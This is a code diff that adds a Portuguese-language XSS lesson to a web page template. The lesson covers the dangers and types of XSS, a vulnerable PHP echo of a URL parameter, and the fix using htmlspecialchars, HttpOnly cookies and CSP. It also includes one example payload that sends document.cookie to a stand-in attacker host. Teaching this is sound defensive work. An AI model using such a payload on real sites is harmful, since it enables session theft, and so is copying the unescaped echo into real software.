@@ -42,6 +42,92 @@
                             <p class="section-text">Cross-Site Scripting (XSS) é uma vulnerabilidade que permite a um atacante injetar scripts maliciosos em páginas confiáveis renderizadas para outros usuários. Esses scripts são executados no navegador da vítima e podem ser usados para roubar cookies, sequestrar sessões ou desfigurar a página.</p>
                         </div>
 
+                        @verbatim
+                        <!-- Why it's dangerous -->
+                        <div class="section-header">
+                            <h3 class="section-title">Por que é perigosa?</h3>
+                        </div>
+                        <div class="section-content">
+                            <div class="danger-box">
+                                <p class="box-title">⚠️ O atacante executa código no navegador da vítima</p>
+                                <p class="section-text">Quando um script malicioso roda na sessão da vítima, ele tem o mesmo poder que o próprio site. Na prática, o atacante pode:</p>
+                                <ul class="guide-list">
+                                    <li><strong>Roubar cookies de sessão</strong> e entrar na conta da vítima sem precisar da senha.</li>
+                                    <li><strong>Capturar o que a vítima digita</strong> (senhas, cartões) com um keylogger em JavaScript.</li>
+                                    <li><strong>Fazer ações em nome da vítima</strong>, como trocar e-mail/senha ou transferir valores.</li>
+                                    <li><strong>Redirecionar para sites falsos</strong> (phishing) ou desfigurar a página.</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <!-- Types -->
+                        <div class="section-header">
+                            <h3 class="section-title">Tipos de XSS</h3>
+                        </div>
+                        <div class="section-content">
+                            <ul class="guide-list">
+                                <li><strong>Refletido:</strong> o script vem em um link/parâmetro e é "devolvido" na resposta na hora (ex.: campo de busca).</li>
+                                <li><strong>Armazenado:</strong> o script é salvo no servidor (comentário, perfil) e atinge todos que abrem a página. É o mais perigoso.</li>
+                                <li><strong>DOM-based:</strong> o próprio JavaScript do site insere dados não tratados no HTML da página.</li>
+                            </ul>
+                        </div>
+
+                        <!-- Vulnerable code -->
+                        <div class="section-header">
+                            <h3 class="section-title">Exemplo de código vulnerável</h3>
+                        </div>
+                        <div class="section-content">
+                            <p class="section-text">O código abaixo pega um valor enviado pelo usuário e o coloca direto no HTML, <strong>sem nenhum tratamento</strong>:</p>
+                            <div class="code-block vulnerable">
+                                <div class="code-header">✗ Vulnerável — PHP</div>
+                                <pre><code><span class="line"><span class="cmt">// Recebe o nome diretamente da URL (ex.: ?nome=Maria)</span></span>
+<span class="line">$nome = $_GET['nome'];</span>
+<span class="line"></span>
+<span class="line"><span class="cmt">// Joga o valor direto no HTML, sem escapar nada</span></span>
+<span class="line bad">echo "&lt;h1&gt;Olá, $nome!&lt;/h1&gt;";</span></code></pre>
+                            </div>
+                        </div>
+
+                        <!-- How the attack works -->
+                        <div class="section-header">
+                            <h3 class="section-title">Como o ataque funciona</h3>
+                        </div>
+                        <div class="section-content">
+                            <p class="section-text">Em vez de um nome, o atacante envia um script no parâmetro da URL. Como o site não trata a entrada, o navegador da vítima executa o código:</p>
+                            <div class="code-block vulnerable">
+                                <div class="code-header">✗ Payload do atacante (na URL)</div>
+                                <pre><code><span class="line bad">?nome=&lt;script&gt;new Image().src='https://atacante.com/roubo?c='+document.cookie&lt;/script&gt;</span></code></pre>
+                            </div>
+                            <p class="section-text" style="margin-top: 10px;">Resultado: o cookie de sessão da vítima é enviado para o servidor do atacante, que pode então sequestrar a conta.</p>
+                        </div>
+
+                        <!-- Solution -->
+                        <div class="section-header">
+                            <h3 class="section-title">Como se proteger (Solução)</h3>
+                        </div>
+                        <div class="section-content">
+                            <p class="section-text">A regra de ouro é: <strong>nunca confie na entrada do usuário</strong> e sempre escape a saída antes de exibi-la no HTML.</p>
+                            <div class="code-block secure">
+                                <div class="code-header">✓ Seguro — PHP</div>
+                                <pre><code><span class="line">$nome = $_GET['nome'];</span>
+<span class="line"></span>
+<span class="line"><span class="cmt">// htmlspecialchars converte &lt; &gt; " ' em entidades seguras</span></span>
+<span class="line good">$seguro = htmlspecialchars($nome, ENT_QUOTES, 'UTF-8');</span>
+<span class="line"></span>
+<span class="line">echo "&lt;h1&gt;Olá, $seguro!&lt;/h1&gt;";</span></code></pre>
+                            </div>
+                            <div class="info-box" style="margin-top: 12px;">
+                                <p class="box-title">✓ Boas práticas</p>
+                                <ul class="guide-list">
+                                    <li><strong>Escape a saída sempre:</strong> use <code class="inline-code">htmlspecialchars()</code> em PHP. No Laravel, <code class="inline-code">{{ $nome }}</code> já escapa automaticamente — evite o <code class="inline-code">{!! !!}</code>.</li>
+                                    <li><strong>Cookies com HttpOnly:</strong> impede que o JavaScript leia o cookie de sessão (<code class="inline-code">document.cookie</code>).</li>
+                                    <li><strong>Content-Security-Policy (CSP):</strong> bloqueia a execução de scripts não autorizados.</li>
+                                    <li><strong>Valide e sanitize</strong> as entradas no servidor, nunca apenas no navegador.</li>
+                                </ul>
+                            </div>
+                        </div>
+                        @endverbatim
+
                         <!-- Practice Section -->
                         <div class="section-header">
                             <h3 class="section-title">Prática</h3>
